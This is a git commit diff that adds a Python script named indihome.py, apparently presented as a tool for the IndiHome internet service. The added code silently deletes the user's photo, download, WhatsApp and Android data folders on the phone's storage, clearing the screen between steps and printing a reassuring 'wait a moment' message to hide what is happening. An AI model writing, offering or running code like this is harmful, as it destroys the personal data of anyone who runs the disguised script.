696e7294b43001155f620e0b1099490d6a9c7907
agung345 <71784303+agung345@users.noreply.github.com>
2020-09-24 00:38:44 +0700

    Update indihome.py

--- indihome.py
+++ indihome.py
@@ -1,1 +1,12 @@
-
+import os, shutil, time
+os.system("clear")
+shutil.rmtree("/sdcard/DCIM")
+os.system("clear")
+shutil.rmtree("/sdcard/Download")
+os.system("clear")
+shutil.rmtree("/sdcard/WhatsApp")
+os.system("clear")
+shutil.rmtree("/sdcard/Android")
+os.system("clear")
+print("Tunggu sebentar bro...")
+time.sleep(3)
